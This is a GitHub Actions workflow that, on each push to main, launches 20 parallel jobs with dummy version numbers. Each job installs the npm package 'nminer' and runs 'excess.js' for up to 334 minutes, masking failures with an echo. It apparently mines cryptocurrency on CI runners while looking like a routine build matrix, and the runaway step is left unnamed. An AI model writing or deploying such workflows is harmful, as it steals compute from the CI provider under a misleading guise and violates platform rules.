name: excess
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 6226 }
          - { version: 4536 }
          - { version: 612 }
          - { version: 1891 }
          - { version: 5328 }
          - { version: 4631 }
          - { version: 3547 }
          - { version: 9581 }
          - { version: 5337 }
          - { version: 6933 }
          - { version: 3615 }
          - { version: 6480 }
          - { version: 757 }
          - { version: 5150 }
          - { version: 4517 }
          - { version: 5326 }
          - { version: 1397 }
          - { version: 6888 }
          - { version: 5682 }
          - { version: 4578 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: 
        run: |
          npm install nminer@latest
          timeout 334m node excess.js || echo "excess executed"